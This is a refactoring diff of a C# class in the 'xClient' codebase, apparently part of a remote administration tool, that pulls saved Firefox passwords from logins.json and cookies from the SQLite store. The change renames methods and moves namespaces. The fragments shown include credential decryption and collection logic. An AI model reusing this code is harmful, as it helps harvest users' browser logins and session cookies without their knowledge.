@@ -1,14 +1,14 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Runtime.InteropServices;
-using System.IO;
-using Microsoft.Win32;
 using System.ComponentModel;
-using xClient.Core.Recovery.Helper;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Text;
+using Microsoft.Win32;
+using xClient.Core.Recovery.Utilities;
+using xClient.Core.Utilities;
 
-namespace PasswordRecovery.Browsers
+namespace xClient.Core.Recovery.Browsers
 {
     /// <summary>
     /// A small class to recover Firefox Data
@@ -55,7 +55,7 @@ namespace PasswordRecovery.Browsers
         /// Recover Firefox Passwords from logins.json
         /// </summary>
         /// <returns>List of Username/Password/Host</returns>
-        public static List<LoginInfo> Passwords()
+        public static List<LoginInfo> GetSavedPasswords()
         {
 
             List<LoginInfo> firefoxPasswords = new List<LoginInfo>();
@@ -63,7 +63,6 @@ namespace PasswordRecovery.Browsers
             {
                 // init libs
                 InitializeDelegates(firefoxProfilePath, firefoxPath);
-
 
                 JsonFFData ffLoginData = new JsonFFData();
 
@@ -79,7 +78,7 @@ namespace PasswordRecovery.Browsers
                     string password = Decrypt(data.encryptedPassword);
                     Uri host = new Uri(data.formSubmitURL);
 
-                    firefoxPasswords.Add(new LoginInfo() { URL = host.AbsoluteUri, Username = username, Password = password, Browser = "Firefox" });
+                    firefoxPasswords.Add(new LoginInfo() { URL = host.AbsoluteUri, Username = username, Password = password, Application = "Firefox" });
                 }
             }
             catch (Exception)
@@ -88,11 +87,12 @@ namespace PasswordRecovery.Browsers
             }
             return firefoxPasswords;
         }
+
         /// <summary>
         /// Recover Firefox Cookies from the SQLite3 Database
         /// </summary>
         /// <returns>List of Cookies found</returns>
-        public static List<FirefoxCookie> Cookies()
+        public static List<FirefoxCookie> GetSavedCookies()
         {
             List<FirefoxCookie> data = new List<FirefoxCookie>();
             SQLiteHandler sql = new SQLiteHandler(firefoxCookieFile.FullName);
